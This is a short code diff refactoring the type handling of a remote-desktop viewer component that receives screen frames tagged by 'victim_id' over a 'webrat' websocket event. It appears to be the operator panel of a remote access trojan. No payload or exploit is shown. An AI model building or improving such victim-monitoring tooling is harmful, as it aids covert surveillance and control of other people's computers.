@@ -129,16 +129,19 @@ export function RemoteDesktopSection() {
     startBtn.addEventListener("click", onStartStop);
 
     const onWsMsg = (ev: CustomEvent<Record<string, unknown>>) => {
-      const msg = ev.detail;
-      const t = String((msg as any).type || "");
+      const msg = (ev && ev.detail ? ev.detail : {}) as Record<string, unknown>;
+      const t = typeof msg.type === "string" ? msg.type : "";
       if (t !== "rd_frame") return;
 
-      const victId = String((msg as any).victim_id || (msg as any).victimId || (msg as any).id || "").trim();
+      const victId = (() => {
+        const v = msg.victim_id ?? msg.victimId ?? msg.id;
+        return typeof v === "string" || typeof v === "number" ? String(v).trim() : "";
+      })();
       if (!victId) return;
       if (!detail.selectedVictimId || String(detail.selectedVictimId) !== victId) return;
       if (!isRunning) return;
 
-      const data = (msg as any).data;
+      const data = msg.data;
       if (!data || typeof data !== "string") return;
 
       let img: HTMLImageElement | null = null;
@@ -173,8 +176,8 @@ export function RemoteDesktopSection() {
       startBtn.removeEventListener("click", onStartStop);
       window.removeEventListener("webrat_ws_message", onWsMsg as EventListener);
       try {
-        unFps && unFps();
-        unRes && unRes();
+        if (unFps) unFps();
+        if (unRes) unRes();
       } catch {
       }
     };
